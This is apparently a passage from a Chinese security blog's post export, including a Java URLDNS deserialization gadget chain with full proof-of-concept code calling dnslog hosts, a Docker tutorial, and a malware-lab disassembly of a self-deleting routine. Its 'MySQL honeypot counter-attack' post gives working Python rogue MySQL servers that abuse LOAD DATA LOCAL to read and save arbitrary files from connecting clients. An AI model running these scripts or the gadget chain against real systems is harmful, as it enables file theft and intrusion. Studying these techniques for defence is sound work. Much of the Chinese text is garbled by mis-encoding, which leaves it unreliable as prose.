if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; else if (p instanceof TreeNode) e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); else &#123; for (int binCount = 0; ; ++binCount) &#123; if ((e = p.next) == null) &#123; p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; if (e != null) &#123; // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; if (++size &gt; threshold) resize(); afterNodeInsertion(evict); return null; &#125; åŸç†åˆ©ç”¨ java.util.HashMap é‡å†™äº† readObject, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ hash å‡½æ•°è®¡ç®— key çš„ hashCode.è€Œ java.net.URL çš„ hashCode åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ getHostAddress æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125;static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125;public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125;protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); //è§£æåŸŸåï¼Œå‘å‡ºDNSè¯·æ±‚ return h; å› æ­¤åˆ©ç”¨é“¾å°±å¾ˆæ˜¾è€Œæ˜“è§äº† ä»£ç  123HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://pxqb7n.dnslog.cn&quot;); hashMap.put(url,123); å¯ä»¥çœ‹åˆ°æ”¶åˆ°DNSè¯·æ±‚ï¼Œä¸‹é¢å°†hashMapåºåˆ—åŒ–ã€‚ 1234567891011121314//ç”±äºnew URL()ä¸­çš„hashCode=-1ï¼Œå› æ­¤ååºåˆ—åŒ–æ—¶ï¼Œä¸èƒ½è¿›å…¥DNSè§£æï¼Œå› æ­¤éœ€åå°„è®¾ç½®hashCodeï¼=-1HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://6g01re.dnslog.cn&quot;); Class urlClass = URL.class; Field fieldHashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); fieldHashCode.setAccessible(true); fieldHashCode.set(url,123456); hashMap.put(url,123); fieldHashCode.set(url,-1); serialize(hashMap); //unSerialize(&quot;ser.bin&quot;); å¯ä»¥çœ‹åˆ°putæ—¶ä¸ºæ”¶åˆ°DNSè¯·æ±‚ ååºåˆ—åŒ–æ—¶æ”¶åˆ°è¯·æ±‚ æ€»ä»£ç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637package urldns;import java.io.*;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class urldns &#123; public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123; HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://dr8bqb.dnslog.cn&quot;); Class urlClass = URL.class; Field hashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url,123); hashMap.put(url,112233); hashCode.set(url,-1); serialize(hashMap); unSerialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); ooStream.writeObject(obj); &#125; public static Object unSerialize(String fileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream oiStrean = new ObjectInputStream(new FileInputStream(fileName)); Object obj = oiStrean.readObject(); return obj; &#125;&#125;","categories":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"javaå®‰å…¨","slug":"javaå®‰å…¨","permalink":"http://example.com/tags/java%E5%AE%89%E5%85%A8/"}]},{"title":"dockerä½¿ç”¨","slug":"dockerä½¿ç”¨","date":"2022-08-09T13:16:50.000Z","updated":"2022-09-01T07:33:10.516Z","comments":true,"path":"2022/08/09/dockerä½¿ç”¨/","link":"","permalink":"http://example.com/2022/08/09/docker%E4%BD%BF%E7%94%A8/","excerpt":"","text":"æ¦‚è¿° Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº Go è¯­è¨€ å¹¶éµä» Apache2.0 åè®®å¼€æºã€‚ Docker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚ å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ï¼ˆç±»ä¼¼ iPhone çš„ appï¼‰,æ›´é‡è¦çš„æ˜¯å®¹å™¨æ€§èƒ½å¼€é”€æä½ã€‚ dockerä¼˜ç‚¹ ç›¸æ¯”é…ç½®å„ç§å¤æ‚ç¯å¢ƒï¼Œdockerå°†åº”ç”¨ç¨‹åºå’Œç¯å¢ƒé…ç½®åˆ†å¼€ã€‚å› æ­¤å¯ä»¥å¿«é€Ÿéƒ¨ç½²ï¼Œæµ‹è¯•ä»£ç ï¼Œå¤§å¤§å‡å°‘ç¼–å†™ä»£ç å’Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œä»£ç ä¹‹é—´çš„å»¶è¿Ÿã€‚ dockeræ¶æ„dockeråŒ…æ‹¬ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ é•œåƒï¼ˆImageï¼‰ï¼šDocker é•œåƒï¼ˆImageï¼‰ï¼Œå°±ç›¸å½“äºæ˜¯ä¸€ä¸ª root æ–‡ä»¶ç³»ç»Ÿã€‚æ¯”å¦‚å®˜æ–¹é•œåƒ ubuntu:16.04 å°±åŒ…å«äº†å®Œæ•´çš„ä¸€å¥— Ubuntu16.04 æœ€å°ç³»ç»Ÿçš„ root æ–‡ä»¶ç³»ç»Ÿã€‚ å®¹å™¨ï¼ˆContainerï¼‰ï¼šé•œåƒï¼ˆImageï¼‰å’Œå®¹å™¨ï¼ˆContainerï¼‰çš„å…³ç³»ï¼Œå°±åƒæ˜¯é¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ç±»å’Œå®ä¾‹ä¸€æ ·ï¼Œé•œåƒæ˜¯é™æ€çš„å®šä¹‰ï¼Œå®¹å™¨æ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚å®¹å™¨å¯ä»¥è¢«åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ã€æš‚åœç­‰ã€‚ ä»“åº“ï¼ˆRepositoryï¼‰ï¼šä»“åº“å¯çœ‹æˆä¸€ä¸ªä»£ç æ§åˆ¶ä¸­å¿ƒï¼Œç”¨æ¥ä¿å­˜é•œåƒã€‚ æ¦‚å¿µ è¯´æ˜ Docker é•œåƒ(Images) Docker é•œåƒæ˜¯ç”¨äºåˆ›å»º Docker å®¹å™¨çš„æ¨¡æ¿ï¼Œæ¯”å¦‚ Ubuntu ç³»ç»Ÿã€‚ Docker å®¹å™¨(Container) å®¹å™¨æ˜¯ç‹¬ç«‹è¿è¡Œçš„ä¸€ä¸ªæˆ–ä¸€ç»„åº”ç”¨ï¼Œæ˜¯é•œåƒè¿è¡Œæ—¶çš„å®ä½“ã€‚ Docker å®¢æˆ·ç«¯(Client) Docker å®¢æˆ·ç«¯é€šè¿‡å‘½ä»¤è¡Œæˆ–è€…å…¶ä»–å·¥å…·ä½¿ç”¨ Docker SDK (https://docs.docker.com/develop/sdk/) ä¸ Docker çš„å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ã€‚ Docker ä¸»æœº(Host) ä¸€ä¸ªç‰©ç†æˆ–è€…è™šæ‹Ÿçš„æœºå™¨ç”¨äºæ‰§è¡Œ Docker å®ˆæŠ¤è¿›ç¨‹å’Œå®¹å™¨ã€‚ Docker Registry Docker ä»“åº“ç”¨æ¥ä¿å­˜é•œåƒï¼Œå¯ä»¥ç†è§£ä¸ºä»£ç æ§åˆ¶ä¸­çš„ä»£ç ä»“åº“ã€‚Docker Hub(https://hub.docker.com) æä¾›äº†åºå¤§çš„é•œåƒé›†åˆä¾›ä½¿ç”¨ã€‚ä¸€ä¸ª Docker Registry ä¸­å¯ä»¥åŒ…å«å¤šä¸ªä»“åº“ï¼ˆRepositoryï¼‰ï¼›æ¯ä¸ªä»“åº“å¯ä»¥åŒ…å«å¤šä¸ªæ ‡ç­¾ï¼ˆTagï¼‰ï¼›æ¯ä¸ªæ ‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚é€šå¸¸ï¼Œä¸€ä¸ªä»“åº“ä¼šåŒ…å«åŒä¸€ä¸ªè½¯ä»¶ä¸åŒç‰ˆæœ¬çš„é•œåƒï¼Œè€Œæ ‡ç­¾å°±å¸¸ç”¨äºå¯¹åº”è¯¥è½¯ä»¶çš„å„ä¸ªç‰ˆæœ¬ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ &lt;ä»“åº“å&gt;:&lt;æ ‡ç­¾&gt; çš„æ ¼å¼æ¥æŒ‡å®šå…·ä½“æ˜¯è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æœä¸ç»™å‡ºæ ‡ç­¾ï¼Œå°†ä»¥ latest ä½œä¸ºé»˜è®¤æ ‡ç­¾ã€‚ Docker Machine Docker Machineæ˜¯ä¸€ä¸ªç®€åŒ–Dockerå®‰è£…çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œé€šè¿‡ä¸€ä¸ªç®€å•çš„å‘½ä»¤è¡Œå³å¯åœ¨ç›¸åº”çš„å¹³å°ä¸Šå®‰è£…Dockerï¼Œæ¯”å¦‚VirtualBoxã€ Digital Oceanã€Microsoft Azureã€‚ dockerå®‰è£… é¦–å…ˆï¼Œæ›´æ–°è½¯ä»¶åŒ…ç´¢å¼•ï¼Œå¹¶ä¸”å®‰è£…å¿…è¦çš„ä¾èµ–è½¯ä»¶ï¼Œæ¥æ·»åŠ ä¸€ä¸ªæ–°çš„ HTTPS è½¯ä»¶æºï¼š 12sudo apt updatesudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common ä½¿ç”¨ä¸‹é¢çš„ curl å¯¼å…¥æºä»“åº“çš„ GPG keyï¼š 1curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - å°† Docker APT è½¯ä»¶æºæ·»åŠ åˆ°ä½ çš„ç³»ç»Ÿï¼š 1sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; æƒ³è¦å®‰è£… Docker æœ€æ–°ç‰ˆæœ¬ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚ 12sudo apt updatesudo apt install docker-ce docker-ce-cli containerd.io dockeré…ç½®å›½å†…é•œåƒæº é˜¿é‡Œäº‘ç”³è¯·é•œåƒåœ°å€https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors touch &#x2F;etc&#x2F;docker&#x2F;daemon.json vim &#x2F;etc&#x2F;docker&#x2F;daemon.json,æ·»åŠ ä»¥ä¸‹å†…å®¹ 123&#123; &quot;registry-mirrors&quot;: [&quot;https://xxx.mirror.aliyuncs.com&quot;]&#125; systemctl reload docker systemctl restart dockerservice dockeråŸºæœ¬æ“ä½œ å¸®åŠ©å‘½ä»¤ 12345678#æ˜¾ç¤ºdockerçš„ç‰ˆæœ¬ä¿¡æ¯docker version #æ˜¾ç¤ºdockerçš„ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬é•œåƒå’Œå®¹å™¨æ•°é‡ docker info #æ˜¾ç¤ºå‘½ä»¤å¸®åŠ©ä¿¡æ¯ docker å‘½ä»¤ --help é•œåƒå‘½ä»¤ 1234567891011#æŸ¥çœ‹æ‰€æœ‰æœ¬åœ°çš„ä¸»æœºä¸Šçš„é•œåƒdocker images #åœ¨docker hubä¸Šæœç´¢æŒ‡å®šé•œåƒï¼Œé»˜è®¤tagä¸ºlatest docker search &lt;image&gt;:&lt;tag&gt; #ä¸‹è½½æŒ‡å®šé•œåƒdocker pull &lt;image&gt;:&lt;tag&gt; #åˆ é™¤æŒ‡å®šé•œåƒdocker rmi -f &lt;image ID&gt; å®¹å™¨å‘½ä»¤ ä½¿ç”¨å®¹å™¨å‘½ä»¤ä¹‹å‰ï¼Œå¿…é¡»è¦æœ‰ç›¸åº”çš„é•œåƒ æ–°å»ºå®¹å™¨ 1234567891011#æ–°å»ºå®¹å™¨å¹¶ä½¿ç”¨docker run [å¯é€‰å‚æ•°] &lt;image&gt; --name=&quot;Name&quot; å®¹å™¨åå­—ï¼Œç”¨äºåŒºåˆ†å®¹å™¨ -d åå°æ–¹å¼è¿è¡Œ -it ä½¿ç”¨äº¤äº’å¼æ–¹å¼è¿è¡Œï¼Œè¿›å…¥å®¹å™¨æŸ¥çœ‹å†…å®¹ -p æŒ‡å®šå®¹å™¨æ˜ å°„ç«¯å£ -p 8080:8080 -p ip:ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ -p ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ -p å®¹å™¨ç«¯å£ -P éšæœºæŒ‡å®šç«¯å£ -e ä¿®æ”¹é…ç½®æ–‡ä»¶ æŸ¥çœ‹å®¹å™¨ 12345#æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨docker ps #æŸ¥çœ‹æ‰€æœ‰å®¹å™¨docker ps -a é€€å‡ºå®¹å™¨ 12345#é€€å‡ºå¹¶åœæ­¢äº¤äº’å®¹å™¨exitæˆ–Ctrl+P #é€€å‡ºä½†ä¸åœæ­¢å®¹å™¨Ctrl+P+Q åˆ é™¤å®¹å™¨ 12345#åˆ é™¤å®¹å™¨ï¼ˆä¸èƒ½åˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œè‹¥å¼ºåˆ¶åˆ é™¤åˆ™éœ€åŠ ä¸Š-få‚æ•°ï¼‰docker rm #å¼ºåˆ¶åˆ é™¤æ‰€æœ‰å®¹å™¨docker rm -f $(docker ps -aq) å¯åŠ¨å’Œåœæ­¢å®¹å™¨ 1234567891011#å¯åŠ¨å®¹å™¨docker start id #é‡å¯å®¹å™¨docker restart id #åœæ­¢å®¹å™¨docker stop id #å¼ºåˆ¶åœæ­¢docker kill id å…¶ä»–å‘½ä»¤ åå°å¯åŠ¨å®¹å™¨ 1docker run -d ubuntu æŸ¥çœ‹æ—¥å¿— 1docker logs -tf --tail &lt;num&gt; &lt;id&gt; æŸ¥çœ‹å®¹å™¨è¿›ç¨‹ä¿¡æ¯ 1docker top id è¿›å…¥å½“å‰æ­£åœ¨è¿è¡Œå®¹å™¨ 1234567é€šå¸¸å®¹å™¨æ˜¯åœ¨åå°è¿è¡Œï¼Œä½†æœ‰æ—¶éœ€è¦è¿›å…¥å®¹å™¨ä¿®æ”¹é…ç½®#æ–¹å¼ä¸€ï¼Œè¿›å…¥å®¹å™¨å¼€å¯æ–°çš„ç»ˆç«¯docker exec -it id bash#æ–¹å¼äºŒï¼Œè¿›å…¥å®¹å™¨æ­£åœ¨æ‰§è¡Œçš„ç»ˆç«¯docker attach id bash æŸ¥çœ‹CUPçŠ¶æ€ 1docker stats id ä¸¾ä¾‹ éƒ¨ç½²Nginx 123456789101112131415161718192021 #æœç´¢é•œåƒ docker search nginx #æ‹‰å–é•œåƒ docker pull nginx #æŸ¥çœ‹é•œåƒ docker images root@ubuntu:/home/xiaoh# docker images REPOSITORY TAG IMAGE ID CREATED SIZE nginx latest 605c77e624dd 2 weeks ago 141MB #åå°å¯åŠ¨é•œåƒ docker run -d --name nginx01 -p 1234:80 nginx #æµ‹è¯•æ˜¯å¦å¯åŠ¨ curl 127.0.0.1:1234 &lt;h1&gt;Welcome to nginx!&lt;/h1&gt;- éƒ¨ç½²Tomcat #æ‹‰å–é•œåƒdocker pull tomcat #åå°å¯åŠ¨é•œåƒdocker run -d -p 3456:8080 â€“name tomcat01 nginx #è¿›å…¥å®¹å™¨docker exec -it tomcat01 &#x2F;bin&#x2F;bash #å‘ç°ç¼ºå°‘linuxå‘½ä»¤ã€ç¼ºå°‘webappsã€‚åŸå› æ˜¯é˜¿é‡Œäº‘é»˜è®¤ä¸‹è½½æœ€å°é•œåƒï¼Œæ‰€æœ‰å…¶ä»–ä¸å¿…è¦çš„èµ„æºéƒ½ä¼šè¢«å‰”é™¤ï¼Œåªä¿è¯æœ€å°å¯è¿è¡Œçš„ç¯å¢ƒã€‚ #å¤åˆ¶webappscp -r webapps.dist&#x2F;* webapps&#96;&#96;&#96;","categories":[{"name":"docker","slug":"docker","permalink":"http://example.com/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"}]},{"title":"Mysqlèœœç½ååˆ¶","slug":"mysqlèœœç½ååˆ¶","date":"2022-08-09T13:16:50.000Z","updated":"2022-09-01T02:40:48.050Z","comments":true,"path":"2022/08/09/mysqlèœœç½ååˆ¶/","link":"","permalink":"http://example.com/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/","excerpt":"","text":"Mysqlç™»å½•åˆ†æ å‘½ä»¤è¡Œç™»å½•Mysqlï¼Œå¹¶æŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ° é¦–å…ˆå¯¹Mysqlç‰ˆæœ¬è¿›è¡ŒéªŒè¯ æ¥ç€Request loginï¼Œä¼ è¾“ç”¨æˆ·åå’Œå¯†ç hash ç™»å½•æˆåŠŸï¼Œè¿”å›OK æŸ¥è¯¢ç‰ˆæœ¬å·å¹¶è¿”å› å½“æ‰§è¡Œä¸€æ¡è¯­å¥æ—¶ï¼ŒæŠ“åŒ…å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æŸ¥è¯¢è¯­å¥æ˜æ–‡ä¼ è¾“ Navicatç™»å½•åˆ†æ ç™»å½•æµç¨‹å’Œå‘½ä»¤è¡Œç™»å½•å·®ä¸å¤šï¼Œå¤šäº†å‡ æ¬¡Query æµç¨‹å¦‚ä¸‹ Mysqlç‰¹æ€§ Mysql é»˜è®¤æ‰“å¼€local_infileï¼Œå¦‚ä¸ºæ‰“å¼€å¯æ‰§è¡Œä¸‹åˆ—å‘½ä»¤ show global variables like&#39;local_infile&#39;; set global local_infile=1; 12345672. MySQLæœåŠ¡ç«¯å¯ä»¥åˆ©ç”¨`LOAD DATA LOCAL`å‘½ä»¤æ¥è¯»å–`MYSQL`å®¢æˆ·ç«¯çš„ä»»æ„æ–‡ä»¶ï¼Œç„¶åä¼ªé€ æ¶æ„æœåŠ¡å™¨å‘è¿æ¥åˆ°è¿™ä¸ªæœåŠ¡å™¨çš„å®¢æˆ·ç«¯å‘é€è¯»å–æ–‡ä»¶çš„`payload`ã€‚3. æœ¬åœ°æ‰§è¡Œå‘½ä»¤ ```mysql load data local infile &#x27;C:/Users/royal/Desktop/pass/passwd.txt&#x27; into table test.test1 fields terminated by &#x27;\\n&#x27;; ![image-20220830105153036](https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220830105153036.png) å¯ä»¥çœ‹åˆ°æˆåŠŸè¯»å–æ•°æ®å¹¶å†™å…¥è¡¨ä¸­ å‘½ä»¤åˆ†æ æŠ“åŒ… æ‰§è¡ŒqueryæŸ¥è¯¢ï¼Œé‡ç‚¹çœ‹ä¸‹è¿”å›åŒ… æ¥ç€è¯»å–æ–‡ä»¶å†…å®¹å¹¶å†™å…¥ ååˆ¶ ååˆ¶æµç¨‹ä¹Ÿå¾ˆæ˜äº†äº†ï¼Œå°±æ˜¯socketç¼–ç¨‹æ¨¡æ‹Ÿnavicatç™»å½•ï¼Œç„¶åæœåŠ¡ç«¯(èœœç½)å‘é€load local file payloadå³å¯ è„šæœ¬å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637# æ¨¡æ‹ŸMysqlç™»å½•import socketserversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) port = 3306serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)serversocket.bind((&quot;&quot;, port))serversocket.listen(5)while True: # å»ºç«‹å®¢æˆ·ç«¯è¿æ¥ clientsocket,addr = serversocket.accept() print(&quot;è¿æ¥åœ°å€: %s&quot; % str(addr)) # è¿”å›ç‰ˆæœ¬ä¿¡æ¯ version_text = b&quot;\\x4a\\x00\\x00\\x00\\x0a\\x38\\x2e\\x30\\x2e\\x31\\x32\\x00\\x08\\x00\\x00\\x00\\x2a\\x51\\x47\\x38\\x48\\x17\\x12\\x21\\x00\\xff\\xff\\xc0\\x02\\x00\\xff\\xc3\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7a\\x6f\\x6e\\x25\\x61\\x3e\\x48\\x31\\x25\\x43\\x2b\\x61\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot; clientsocket.sendall(version_text) try: # å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯ clientsocket.recv(9999) except Exception as e: print(e) # Response OK verification = b&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot; clientsocket.sendall(verification) try: # SET NAMES utf8mb4 clientsocket.recv(9999) except Exception as e: print(e) # Response TABULAR evil_response = b&quot;\\x09\\x00\\x00\\x01\\xfb\\x43\\x3a\\x2f\\x31\\x2e\\x74\\x78\\x74&quot; clientsocket.sendall(evil_response) # file_text print(clientsocket.recv(9999)) clientsocket.close() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# ååˆ¶è„šæœ¬ è¯»å–C:\\\\Windows\\\\PFRO.logæ–‡ä»¶# coding=utf-8import socketimport osserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM) port = 3306server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)server.bind((&quot;&quot;, port))server.listen(5)def get_data(filename, client, addr): base_path = os.path.abspath(&#x27;.&#x27;) + &quot;/log/&quot; + addr[0] if not os.path.exists(base_path): os.makedirs(base_path) evil_response = str.encode(chr(len(filename)+1)) + b&quot;\\x00\\x00\\x01\\xfb&quot; + str.encode(filename) # æ¶æ„å“åº”åŒ… client.sendall(evil_response) file_data = client.recv(999999) print(file_data) with open(base_path + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;&quot;), &quot;wb+&quot;) as f: f.write(file_data) f.close()while True: # å»ºç«‹å®¢æˆ·ç«¯è¿æ¥ client, addr = server.accept() print(&quot;è¿æ¥åœ°å€: %s&quot; % str(addr)) # è¿”å›ç‰ˆæœ¬ä¿¡æ¯ version_text = b&quot;\\x4a\\x00\\x00\\x00\\x0a\\x38\\x2e\\x30\\x2e\\x31\\x32\\x00\\x08\\x00\\x00\\x00\\x2a\\x51\\x47\\x38\\x48\\x17\\x12\\x21\\x00\\xff\\xff\\xc0\\x02\\x00\\xff\\xc3\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7a\\x6f\\x6e\\x25\\x61\\x3e\\x48\\x31\\x25\\x43\\x2b\\x61\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot; client.sendall(version_text) try: # å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯ client.recv(9999) except Exception as e: print(e) # Response OK verification = b&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot; client.sendall(verification) try: # SET NAMES utf8mb4 client.recv(9999) except Exception as e: print(e) # Response TABULAR filename = &quot;C:\\\\Windows\\\\PFRO.log&quot; #è¿™é‡Œä¸ºè¦è¯»å–çš„æ–‡ä»¶è·¯å¾„ get_data(filename, client, addr) client.close()","categories":[{"name":"çº¢è“æ”»é˜²","slug":"çº¢è“æ”»é˜²","permalink":"http://example.com/categories/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2/"}],"tags":[{"name":"æ”»é˜²","slug":"æ”»é˜²","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2/"}]},{"title":"æ¶æ„ä»£ç åˆ†ælab9-1","slug":"lab9-1","date":"2022-08-06T13:16:50.000Z","updated":"2022-09-01T00:52:23.531Z","comments":true,"path":"2022/08/06/lab9-1/","link":"","permalink":"http://example.com/2022/08/06/lab9-1/","excerpt":"","text":"çºµè§‚è¯¦ç»†åˆ†æ æ‰“å¼€ç¨‹åºè§‚å¯Ÿå †æ ˆå‘ç°å¹¶ä¸æ˜¯mainå‡½æ•°å…¥å£ç‚¹ åˆ©ç”¨idaåˆ†æmainå‡½æ•°åœ°å€ï¼Œå¹¶åœ¨odä¸­æ–­ç‚¹ ä¸€æ­¥ä¸€æ­¥è·Ÿè¿›è°ƒè¯• æŸ¥çœ‹å‚æ•°ä¸ªæ•°æ˜¯å¦ä¸º1ï¼Œç»§ç»­å‘ä¸‹ç›´æ¥call 401000 ä»£ç å¤ªé•¿ä¸å¥½æˆªå›¾ï¼Œç›´æ¥æ”¾ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283.text:00402410 push ebp.text:00402411 mov ebp, esp.text:00402413 sub esp, 208h.text:00402419 push ebx.text:0040241A push esi.text:0040241B push edi.text:0040241C push 104h ; nSize.text:00402421 lea eax, [ebp+Filename].text:00402427 push eax ; lpFilename.text:00402428 push 0 ; hModule.text:0040242A call ds:GetModuleFileNameA.text:00402430 push 104h ; cchBuffer.text:00402435 lea ecx, [ebp+Filename].text:0040243B push ecx ; lpszShortPath.text:0040243C lea edx, [ebp+Filename].text:00402442 push edx ; lpszLongPath.text:00402443 call ds:GetShortPathNameA.text:00402449 mov edi, offset aCDel ; &quot;/c del &quot;.text:0040244E lea edx, [ebp+Parameters].text:00402454 or ecx, 0FFFFFFFFh.text:00402457 xor eax, eax.text:00402459 repne scasb.text:0040245B not ecx.text:0040245D sub edi, ecx.text:0040245F mov esi, edi.text:00402461 mov eax, ecx.text:00402463 mov edi, edx.text:00402465 shr ecx, 2.text:00402468 rep movsd.text:0040246A mov ecx, eax.text:0040246C and ecx, 3.text:0040246F rep movsb.text:00402471 lea edi, [ebp+Filename].text:00402477 lea edx, [ebp+Parameters].text:0040247D or ecx, 0FFFFFFFFh.text:00402480 xor eax, eax.text:00402482 repne scasb.text:00402484 not ecx.text:00402486 sub edi, ecx.text:00402488 mov esi, edi.text:0040248A mov ebx, ecx.text:0040248C mov edi, edx.text:0040248E or ecx, 0FFFFFFFFh.text:00402491 xor eax, eax.text:00402493 repne scasb.text:00402495 add edi, 0FFFFFFFFh.text:00402498 mov ecx, ebx.text:0040249A shr ecx, 2.text:0040249D rep movsd.text:0040249F mov ecx, ebx.text:004024A1 and ecx, 3.text:004024A4 rep movsb.text:004024A6 mov edi, offset aNul ; &quot; &gt;&gt; NUL&quot;.text:004024AB lea edx, [ebp+Parameters].text:004024B1 or ecx, 0FFFFFFFFh.text:004024B4 xor eax, eax.text:004024B6 repne scasb.text:004024B8 not ecx.text:004024BA sub edi, ecx.text:004024BC mov esi, edi.text:004024BE mov ebx, ecx.text:004024C0 mov edi, edx.text:004024C2 or ecx, 0FFFFFFFFh.text:004024C5 xor eax, eax.text:004024C7 repne scasb.text:004024C9 add edi, 0FFFFFFFFh.text:004024CC mov ecx, ebx.text:004024CE shr ecx, 2.text:004024D1 rep movsd.text:004024D3 mov ecx, ebx.text:004024D5 and ecx, 3.text:004024D8 rep movsb.text:004024DA push 0 ; nShowCmd.text:004024DC push 0 ; lpDirectory.text:004024DE lea eax, [ebp+Parameters].text:004024E4 push eax ; lpParameters.text:004024E5 push offset File ; &quot;cmd.exe&quot;.text:004024EA push 0 ; lpOperation.text:004024EC push 0 ; hwnd.text:004024EE call ds:ShellExecuteA.text:004024F4 push 0 ; int.text:004024F6 call _exit.text:004024F6 sub_402410 endp 